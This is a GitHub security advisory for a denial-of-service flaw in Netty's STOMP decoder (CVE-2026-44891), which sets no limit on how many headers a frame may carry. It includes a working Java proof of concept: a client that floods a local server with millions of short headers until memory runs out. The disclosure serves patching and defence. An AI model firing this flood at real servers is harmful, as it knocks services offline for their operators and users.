# [H] Netty: Denial of Service via Unbounded Headers in StompSubframeDecoder

## Summary
Severity: High
Advisory: GHSA-vhch-2wf3-m8rp
CVE: CVE-2026-44891
CWE: CWE-400, CWE-770
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-vhch-2wf3-m8rp
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-stomp` — affected >=4.2.0.Alpha1 <4.2.16.Final
- Maven: `io.netty:netty-codec-stomp` — affected >=0 <4.1.136.Final

## Details
### Summary
The StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, allowing an attacker to cause an OutOfMemoryError, leading to a Denial of Service.

### Details
`io.netty.handler.codec.stomp.StompSubframeDecoder` implements the STOMP protocol. The `maxLineLength` parameter restricts the length of individual header lines, but there is no mechanism to limit the total number of headers in a single STOMP frame. An attacker can send a large number of short headers (e.g., `a: 1\n`), which are accumulated in memory inside the `DefaultStompHeadersSubframe` until the JVM throws an OutOfMemoryError.

### PoC
Run the server with `-Xmx256m`

```java
public final class ServerApp {
    public static void main(String[] args) throws Exception {
        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
        try {
            ChannelFuture serverFuture = new ServerBootstrap()
                    .group(group)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(new StompSubframeDecoder())
                    .bind(8080)
                    .sync();
            serverFuture.channel().closeFuture().sync();
        } finally {
            group.shutdownGracefully();
        }
    }
}
```

```java
public final class ClientApp {
    public static void main(String[] args) throws Exception {
        try (Socket socket = new Socket("127.0.0.1", 8080)) {
            OutputStream out = socket.getOutputStream();

            out.write("CONNECT\n".getBytes(StandardCharsets.UTF_8));

            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 1000; i++) {
                sb.append("a:1\n");
            }
            byte[] bulkHeaders = sb.toString().getBytes(StandardCharsets.UTF_8);

            for (int i = 1; i <= 50_000; i++) {
                out.write(bulkHeaders);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### Impact
Denial of Service: An attacker can easily exhaust the server's memory by sending a single malicious STOMP message. Any server exposing a STOMP endpoint based on StompSubframeDecoder is vulnerable to DoS.

## References
- https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp
- https://github.com/netty/netty
